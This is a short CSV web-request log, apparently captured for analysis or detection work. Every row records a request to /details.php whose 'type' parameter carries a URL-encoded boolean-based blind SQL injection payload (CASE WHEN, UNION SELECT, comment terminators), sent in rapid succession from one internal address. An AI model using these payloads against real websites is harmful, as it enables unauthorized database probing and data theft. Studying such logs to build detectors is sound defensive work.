full_url,event_time,hostname
/details.php?prod=5&type=2%27%29%20AND%204553%3D%28SELECT%20%28CASE%20WHEN%20%284553%3D4553%29%20THEN%204553%20ELSE%20%28SELECT%202572%20UNION%20SELECT%207484%29%20END%29%29--%20-,1680093125.508104,10.0.2.31
/details.php?prod=5&type=2%27%29%29%20AND%206022%3D%28SELECT%20%28CASE%20WHEN%20%286022%3D5584%29%20THEN%206022%20ELSE%20%28SELECT%205584%20UNION%20SELECT%209180%29%20END%29%29--%20-,1680093125.512801,10.0.2.31
/details.php?prod=5&type=2%27%29%29%20AND%204553%3D%28SELECT%20%28CASE%20WHEN%20%284553%3D4553%29%20THEN%204553%20ELSE%20%28SELECT%202572%20UNION%20SELECT%207484%29%20END%29%29--%20-,1680093125.517713,10.0.2.31
/details.php?prod=5&type=2%27%20AND%204447%3D%28SELECT%20%28CASE%20WHEN%20%284447%3D7412%29%20THEN%204447%20ELSE%20%28SELECT%207412%20UNION%20SELECT%205011%29%20END%29%29--%20-,1680093125.52181,10.0.2.31
/details.php?prod=5&type=2%27%20AND%204553%3D%28SELECT%20%28CASE%20WHEN%20%284553%3D4553%29%20THEN%204553%20ELSE%20%28SELECT%202572%20UNION%20SELECT%207484%29%20END%29%29--%20-,1680093125.525509,10.0.2.31
/details.php?prod=5&type=2%25%27%20AND%207006%3D%28SELECT%20%28CASE%20WHEN%20%287006%3D8044%29%20THEN%207006%20ELSE%20%28SELECT%208044%20UNION%20SELECT%206189%29%20END%29%29--%20-,1680093125.529501,10.0.2.31
/details.php?prod=5&type=2%25%27%20AND%204553%3D%28SELECT%20%28CASE%20WHEN%20%284553%3D4553%29%20THEN%204553%20ELSE%20%28SELECT%202572%20UNION%20SELECT%207484%29%20END%29%29--%20-,1680093125.533801,10.0.2.31
/details.php?prod=5&type=2%22%29%20AND%204773%3D%28SELECT%20%28CASE%20WHEN%20%284773%3D4426%29%20THEN%204773%20ELSE%20%28SELECT%204426%20UNION%20SELECT%204308%29%20END%29%29--%20-,1680093125.538074,10.0.2.31
/details.php?prod=5&type=2%22%29%20AND%204553%3D%28SELECT%20%28CASE%20WHEN%20%284553%3D4553%29%20THEN%204553%20ELSE%20%28SELECT%202572%20UNION%20SELECT%207484%29%20END%29%29--%20-,1680093125.541491,10.0.2.31
/details.php?prod=5&type=2%22%20AND%208861%3D%28SELECT%20%28CASE%20WHEN%20%288861%3D3486%29%20THEN%208861%20ELSE%20%28SELECT%203486%20UNION%20SELECT%205845%29%20END%29%29--%20-,1680093125.545557,10.0.2.31
/details.php?prod=5&type=2%22%20AND%204553%3D%28SELECT%20%28CASE%20WHEN%20%284553%3D4553%29%20THEN%204553%20ELSE%20%28SELECT%202572%20UNION%20SELECT%207484%29%20END%29%29--%20-,1680093125.549207,10.0.2.31
/details.php?prod=5&type=2%29%20AND%201015%3D6206--%20-,1680093125.554445,10.0.2.31
/details.php?prod=5&type=2%29%20AND%201215%3D1215--%20-,1680093125.557888,10.0.2.31
